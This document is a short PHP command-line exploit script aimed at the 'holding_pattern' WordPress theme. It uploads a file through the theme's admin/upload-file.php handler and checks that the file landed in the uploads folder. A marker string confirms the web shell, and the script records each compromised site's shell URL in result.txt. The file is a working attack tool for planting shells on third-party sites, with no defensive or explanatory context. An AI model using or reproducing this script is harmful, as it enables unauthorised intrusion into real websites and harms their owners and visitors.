<?php
$site=$argv[1];
		$uploadfile="tool/error.php";
		$target = "$site/wp-content/themes/holding_pattern/admin/upload-file.php";
		$domain = explode("/", $target);
		$server_addr = gethostbyname($domain[2]);
        $ch = curl_init("$site/wp-content/themes/holding_pattern/admin/upload-file.php");
        curl_setopt($ch, CURLOPT_POST, true);   
        curl_setopt($ch, CURLOPT_POSTFIELDS,array(md5($server_addr)=>"@$uploadfile",'upload_path'=>base64_encode('.')));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36");
        $result = curl_exec($ch);
		curl_close ($ch);
		$url1="$site/wp-content/themes/holding_pattern/uploads/error.php";
		$get1=@file_get_contents($url1);
		if(preg_match('#Hamdida#',$get1)){
            echo "$site -> Exploited \n  Shell -> $site/wp-content/themes/holding_pattern/uploads/error.php\n";
        $path = "$site/wp-content/themes/holding_pattern/uploads/error.php";
		            $save = fopen ('result.txt','a+');
            fwrite ($save,$path."\n");
        }else
        echo "$site -> Themes Holding Pattern Not Exploited\n";